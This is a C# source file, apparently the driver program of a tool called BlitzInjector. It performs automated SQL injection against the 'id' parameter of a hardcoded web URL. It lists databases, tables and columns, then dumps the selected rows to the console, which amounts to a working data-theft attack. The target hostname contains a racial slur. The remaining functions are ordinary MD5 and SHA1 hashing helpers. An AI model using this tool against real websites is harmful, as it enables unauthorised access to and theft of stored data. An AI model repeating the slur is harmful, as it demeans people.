using System;
using System.Collections.Generic;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using BlitzInjector.Request;

namespace BlitzInjector
{
    public class Main1
    {

        public static void Main(string[] args)
        {
            var data = new Dictionary<string, string> {{"id", "1"}};
            var grh = new GetRequestHandler(new Uri("http://nigga.freetzi.com/test.php"), data);
            var Injector = BlitzInjector.Create(grh, "id");
            var Databases = Injector.FetchDatabases();
            Console.WriteLine("Fetching databases in url(http://nigga.freetzi.com/test.php)...");
            Console.WriteLine("DONE!");
            for (int i = 1; i < Databases.Length - 1; i++ )
                Console.WriteLine(i + ") " + Databases[i]);
            Console.WriteLine("Enter database:");
            var db = Console.ReadLine();
            var tables = Injector.FetchTables(db);
            Console.WriteLine("Fetching from:" + db + "...");
            Console.WriteLine("DONE!");
            for (int i = 1; i < tables.Length - 1; i++)
                Console.WriteLine(i + ") " + tables[i]);
            Console.WriteLine("Enter table:");
            var table = Console.ReadLine();
            var columns = Injector.FetchColumns(db, table);
            Console.WriteLine("Fetching from:" + table + "...");
            Console.WriteLine("DONE!");
            for (int i = 1; i < columns.Length - 1; i++)
                Console.WriteLine(i + ") " + columns[i]);
            Console.WriteLine("Enter columns:");
            var column = Console.ReadLine();
            Console.WriteLine("Fetching rows in {0}.{1} ({2})...", db, table, columns);
            var rows = Injector.FetchRows(db, table, column);
            Console.WriteLine("DONE!");
            var ColumnsArray = column.Split(',');
            foreach (var row in rows)
            {
                if(row == null)
                    break;
                for (int i = 0; i < row.Length; i++)
                {
                    Console.Write("{0}: {1} || ", ColumnsArray[i], row[i]);
                }
                Console.WriteLine();
            }

            Console.ReadLine();

        }

        public static string CalculateMD5Hash(string input)
        {
            // step 1, calculate MD5 hash from input
            MD5 md5 = System.Security.Cryptography.MD5.Create();
            byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(input);
            byte[] hash = md5.ComputeHash(inputBytes);

            // step 2, convert byte array to hex string
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < hash.Length; i++)
            {
                sb.Append(hash[i].ToString("X2"));
            }
            return sb.ToString();
        }

        public static byte[] GetHash(string inputString)
        {
            HashAlgorithm algorithm = SHA1.Create(); // SHA1.Create()
            return algorithm.ComputeHash(Encoding.UTF8.GetBytes(inputString));
        }

        public static string GetHashString(string inputString)
        {
            StringBuilder sb = new StringBuilder();
            foreach (byte b in GetHash(inputString))
                sb.Append(b.ToString("X2"));

            return sb.ToString();
        }

    }
}
